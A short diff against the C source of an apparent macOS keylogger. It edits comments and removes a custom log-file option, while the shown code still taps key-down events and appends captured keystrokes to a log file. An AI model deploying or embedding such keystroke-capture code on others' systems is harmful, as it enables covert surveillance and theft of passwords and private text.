@@ -303,7 +303,7 @@ CGEventRef keyboardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef 
           bufferFree = bufferFree + 1;
         }
 
-        // once a complete word or segment is found, prints and reset buffer
+        // once a complete word or segment is found or if a limit is reached, prints and reset buffer
         if(complete == true || bufferFree >= (sizeof buffer)-10){
           fprintf(logfile, "%s", buffer);
           complete = false;
@@ -335,8 +335,6 @@ CGEventRef keyboardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef 
 
 int main(int argc, const char *argv[]) {
 
-    /* EVENTS SETUP */
-
     // We are interested in key presses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
     // Create an event tap to retrieve keypresses
@@ -357,7 +355,7 @@ int main(int argc, const char *argv[]) {
     time_t result = time(NULL);
     logfile = fopen(PATH, "a");
 
-    // Clear the logfile if clear argument used or log to specific file if given.
+    // Clear the logfile if clear argument used or open logfile if open argument used
     if(argc == 2) {
         if(strcmp(argv[1], "clear") == 0) {
             fopen(PATH, "w");
@@ -381,9 +379,6 @@ int main(int argc, const char *argv[]) {
             while(s!=EOF);
             fclose(f);
             exit(1);
-        }
-        else {
-            logfile = fopen(argv[1], "a");
         }
     }
 
